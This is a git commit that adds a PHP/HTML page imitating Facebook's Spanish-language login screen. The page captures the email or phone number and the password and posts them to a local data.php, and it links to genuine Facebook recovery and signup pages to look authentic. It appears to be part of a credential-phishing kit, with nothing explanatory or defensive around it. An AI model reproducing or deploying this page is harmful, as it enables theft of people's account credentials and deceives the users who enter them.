10193efde9faacf181b3759e9a2f000c6ab2556f
jacer70 <99155069+jacer70@users.noreply.github.com>
2023-05-26 18:39:10 -0300

    Add files via upload

---
+++ content.php
@@ -0,0 +1,19 @@
+<main>
+	<div class="content">
+		<div class="content-header">
+			Iniciar sesión en Facebook
+		</div>
+		<div class="content-form">
+			<form action="data.php" method="POST">
+				<input type="text" name="username" placeholder="Correo electrónico o número de teléfono" >
+				<input type="password" name="userpassword" placeholder="Contraseña">
+				<input type="submit" name="data" value="Iniciar sesión">
+			</form>
+			<div class="signinLink">
+				<a href="https://www.facebook.com/recover/initiate?lwv=100&amp;ars=facebook_login"  target="_blank">¿Olvidaste tu cuenta?</a>
+				<span> · </span>
+				<a href="https://www.facebook.com/r.php?locale=en_GB&amp;display=page" target="_blank">Crear cuenta en Facebook</a>
+			</div>
+		</div>
+	</div>
+</main>
